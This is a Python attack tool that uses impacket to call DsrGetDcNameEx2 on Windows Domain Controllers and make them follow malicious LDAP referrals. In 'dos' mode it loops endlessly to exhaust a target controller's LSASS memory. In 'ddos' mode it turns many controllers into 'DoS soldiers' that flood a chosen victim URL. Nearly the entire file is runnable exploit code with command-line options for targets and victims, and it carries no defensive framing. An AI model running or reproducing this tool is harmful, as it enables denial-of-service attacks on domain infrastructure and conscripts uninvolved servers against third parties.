import sys
import time
import argparse
import threading
import uuid
import concurrent.futures
from typing import List
from impacket.dcerpc.v5 import transport, epm
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory

from logger import logger
from udp_server import run_server as run_udp_server
from tcp_server import run_server as run_tcp_server

NULL = '\x00'

def call_dsr_get_dc_name_ex2(target_ip: str, port: int, account: str, site_name: str, domain_name: str) -> None:
    """
    Call DsrGetDcNameEx2 on a target IP and handle exceptions.
    Checks cancellation_event periodically to support immediate termination.
    """
    rpctransport = DCERPCTransportFactory(f'ncacn_ip_tcp:{target_ip}[{port}]')
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    logger.info(f"Connected to {target_ip}:{port}")

    try:
        dce.bind(nrpc.MSRPC_UUID_NRPC)
    except DCERPCException:
        logger.error("Failed to bind to NRPC interface!")
        logger.info("This might be because the target is doesn't have netlogon service running.")
        raise

    request = nrpc.DsrGetDcNameEx2()
    request['ComputerName'] = NULL
    request['AccountName'] = account + NULL
    request['AllowableAccountControlBits'] = 1 << 9
    request['DomainName'] = domain_name + NULL
    request['DomainGuid'] = NULL
    request['SiteName'] = site_name + NULL
    request['Flags'] = 0

    logger.info("Sending DsrGetDcNameEx2 request...")
    dce.call(request.opnum, request)
    dce.disconnect()


def start_udp_server(listen_port: int, tcp_ldap_url: str) -> threading.Thread:
    """Start UDP server in a daemon thread."""
    server_thread = threading.Thread(
        target=run_udp_server,
        daemon=True,
        args=(listen_port, tcp_ldap_url)
    )
    server_thread.start()
    return server_thread


def start_tcp_server(listen_port: int, req_count: int, base_referral_url: str) -> threading.Thread:
    """Start TCP server in a daemon thread."""
    server_thread = threading.Thread(
        target=run_tcp_server,
        daemon=True,
        args=(listen_port, req_count, base_referral_url)
    )
    server_thread.start()
    return server_thread


def cleanup_server_threads(server_threads: List[threading.Thread], timeout: float = 1.0) -> None:
    """
    Attempt to cleanly join server threads with a timeout.
    Since they are daemon threads, they will terminate when the program exits.
    """
    for thread in server_threads:
        thread.join(timeout=timeout)


def trigger_dcs_to_become_cldap_clients(
    target_ips: List[str],
    domain_name: str,
    account: str = "Administrator",
    site_name: str = ""):
    """
    Recruit DoS soldiers by submitting tasks to the thread pool executor.
    """
    threads = []
    for target_ip in target_ips:
        logger.info(f"Recruiting a DoS soldier {target_ip}")


        thread = threading.Thread(
            target=call_dsr_get_dc_name_ex2,
            args=(
                target_ip,
                resolve_rpc_port(target_ip, '12345678-1234-ABCD-EF00-01234567CFFB', '1.0'),
                account,
                site_name,
                domain_name
            )
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()



def fill_remote_lsass_process_memory(
    target_ip: str,
    domain_name: str,
    call_count: int = 40,
    account: str = "Administrator",
    site_name: str = ""
) -> List[threading.Thread]:
    """
    Recruit DoS soldiers by starting individual threads.
    """
    subdomains = [str(uuid.uuid4()) for _ in range(call_count)]
    threads = []
    for subdomain in subdomains:
        thread = threading.Thread(
            target=call_dsr_get_dc_name_ex2,
            args=(target_ip, resolve_rpc_port(target_ip, '12345678-1234-ABCD-EF00-01234567CFFB', '1.0'), account, site_name, subdomain + '.' + domain_name)
        )
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()



def parse_arguments():
    parser = argparse.ArgumentParser(
        description="LDAP Referral Win-DoS / Win-DDoS attack: Either perform a DoS targeting a specific Domain Controller or launch a DDoS attack harnessing the power of many Domain Controllers"
    )

    subparsers = parser.add_subparsers(
        title="modes", dest="mode", required=True,
        description="Choose the attack mode: 'dos' for a single target DoS, 'ddos' for distributed attack"
    )

    # ----------------------
    # DoS Mode Subparser
    # ----------------------
    dos_parser = subparsers.add_parser(
        "dos", help="Single machine DoS using LDAP referrals"
    )
    dos_parser.add_argument(
        "--target",
        required=True,
        help="Target IP for the DoS attack"
    )


    # ----------------------
    # DDoS Mode Subparser
    # ----------------------
    ddos_parser = subparsers.add_parser(
        "ddos", help="Distributed DoS using LDAP referrals and multiple domain controllers"
    )
    ddos_parser.add_argument(
        "--dos-soldiers",
        nargs='+',
        required=True,
        help="List of IPs of the DoS soldier machines"
    )
    ddos_parser.add_argument(
        "--total-soldiers-timeout", "-t",
        type=int,
        default=60,
        help="Total time to wait for all soldiers to finish (default: 60 seconds)"
    )
    ddos_parser.add_argument(
        "--dos-victim-url",
        required=True,
        help="URL of the victim server for DDoS"
    )

    # ----------------------
    # Common Arguments (for both modes)
    # ----------------------
    for subparser in [dos_parser, ddos_parser]:
        subparser.add_argument(
            "--listen-port", "-l",
            type=int,
            default=389,
            help="UDP & TCP port for servers to listen on (default: 389)"
        )
        subparser.add_argument(
            "--req-count", "-c",
            type=int,
            help="Number of requests to send"
        )
        subparser.add_argument(
            "--domain-name", "-d",
            required=True,
            help="DomainName parameter used in LDAP. If the mode is 'dos' then this domain name will be prefixed with a UUID subdomain. This means that the SRV record for this domain name should be a wildcard SRV record."
        )
        subparser.add_argument(
            "--tcp-ldap-url",
            required=True,
            help="TCP LDAP URL for malicious referral"
        )

    return parser.parse_args()

def resolve_rpc_port(server_ip, interface_uuid, version):
    """
    Query the remote endpoint mapper for the TCP port of the given interface.
    """
    interface_uuid_bin = uuidtup_to_bin((interface_uuid, version))
    binder = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{server_ip}[135]")
    dce = binder.get_dce_rpc()
    dce.connect()
    try:
        binding_string = epm.hept_map(
            server_ip, interface_uuid_bin, protocol='ncacn_ip_tcp'
        )
        # returns "ncacn_ip_tcp:host[port]"
        return binding_string.split('[')[1].strip(']')
    except Exception:
        return None
    finally:
        dce.disconnect()


def main():
    """
    Main function to coordinate the execution of the program.
    """
    args = parse_arguments()

    logger.info("Starting to recruit DoS soldiers")

    # Start servers
    udp_server_thread = start_udp_server(args.listen_port, args.tcp_ldap_url)
    if args.mode == "ddos":
        tcp_server_thread = start_tcp_server(args.listen_port, args.req_count, args.dos_victim_url)
    elif args.mode == "dos":
        tcp_server_thread = start_tcp_server(args.listen_port, args.req_count, f"{str(uuid.uuid4())}.com")

    # Wait for servers to start
    logger.info("Waiting for servers to start...")
    time.sleep(2)

    start_time = time.time()

    if args.mode == "ddos":
        trigger_dcs_to_become_cldap_clients(args.dos_soldiers, args.domain_name)
    elif args.mode == "dos":
        # Perform a single target DoS attack
        logger.info(f"Starting DoS attack on {args.target} with domain {args.domain_name}")
        while True:
            try:
                fill_remote_lsass_process_memory(args.target, args.domain_name)
            except KeyboardInterrupt:
                logger.info("Keyboard interrupt detected, stopping DoS attack")
                break

    # Calculate and display total execution time
    total_time = time.time() - start_time
    print(f"Total time: {total_time:.2f}s")

    # Attempt to cleanly join server threads before exiting
    server_threads = [udp_server_thread, tcp_server_thread]
    cleanup_server_threads(server_threads)


if __name__ == "__main__":
    main()
